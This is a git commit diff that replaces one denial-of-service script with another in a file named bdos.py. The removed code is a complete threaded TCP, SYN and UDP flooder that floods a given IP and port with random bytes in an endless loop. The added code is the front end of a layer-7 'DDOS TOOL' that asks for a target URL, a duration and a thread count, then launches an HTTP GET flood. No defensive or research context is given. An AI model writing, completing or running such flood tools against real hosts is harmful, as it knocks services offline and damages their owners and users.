bcbe76f8031c70f3744514f33379e27a8ce32bd3
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-01 03:10:38 +0300

    Update bdos.py

--- bdos.py
+++ bdos.py
@@ -1,79 +1,53 @@
-#!/usr/bin/env python
-#God-Flood(tcp,syn,udp) by LiGhT
-import threading, sys, time, random, socket
+# Created by nuvem and tsk
 
-if len(sys.argv) < 4:
-    print("God-Flood By LiGhT")
-    sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
+# Import modules
+import os
+import sys
+import argparse
+from colorama import Fore
 
-ip = sys.argv[1]
-port = int(sys.argv[2])
-size = int(sys.argv[3])
-packets = int(sys.argv[3])
+os.system("@cls & @title Overload DDOS Tool by: 7zx and 8fn & @color e")
 
-class syn(threading.Thread):
-    def __init__(self, ip, port, packets):
-        self.ip = ip
-        self.port = port
-        self.packets = packets
-        self.syn = socket.socket()
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                self.syn.connect((self.ip, self.port))
-            except:
-                pass
+# Get the actual directory
+os.chdir(os.path.dirname(os.path.realpath(__file__)))
 
-class tcp(threading.Thread):
-    def __init__(self, ip, port, size, packets):
-        self.ip = ip
-        self.port = port
-        self.size = size
-        self.packets = packets
-        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                bytes = random._urandom(self.size)
-                socket.connect(self.ip, self.port)
-                socket.setblocking(0)
-                socket.sendto(bytes,(self.ip, self.port))
-            except:
-                pass
+try:
+    from tools.crash import CriticalError
+    import tools.addons.clean
+    import tools.addons.logo
+    # import tools.addons.winpcap
+    import tools.addons.wireshark
+    from tools.method import AttackMethod
+except ImportError as err:
+    CriticalError("Failed to import some packages", err)
+    sys.exit(1)
 
-class udp(threading.Thread):
-    def __init__(self, ip, port, size, packets):
-        self.ip = ip
-        self.port = port
-        self.size = size
-        self.packets = packets
-        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                bytes = random._urandom(self.size)
-                if self.port == 0:
-                    self.port = random.randrange(1, 65535)
-                self.udp.sendto(bytes,(self.ip, self.port))
-            except:
-                pass
+method = "GET"
+logo = """
+ ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
+▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
+▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
+▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
+░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
+░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
+  ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
+░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
+    ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
+              ░                                               ░     
+"""
+CRED2 = '\33[91m'
 
-while True:
-    try:
-        if size > 65507:
-            sys.exit("Invalid Number Of Packets!")
-        u = udp(ip,port,size,packets)
-        t = tcp(ip,port,size,packets)
-        s = syn(ip,port,packets)
-        u.start()
-        t.start()
-        s.start()
-    except KeyboardInterrupt:
-        print("Stopping Flood!")
-        sys.exit()
-    except socket.error, msg:
-        print("Socket Couldn't Connect")
-        sys.exit()
+if __name__ == "__main__":
+    # Print help
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(CRED2 + logo + CRED2)
+    print("├───DDOS TOOL LAYER 7")
+    time = int(input(f"{Fore.RED}│   ├───TIME:{Fore.RESET}"))
+    threads = int(input(f"{Fore.RED}│   └───THREADS:{Fore.RESET}"))
+    target = str(input(f"{Fore.RED}│   └───URL:{Fore.RESET}"))
+    with AttackMethod(
+        duration=time, name=method, threads=threads, target=target
+    ) as Flood:
+        Flood.Start()
+else:
+    sys.exit(1)
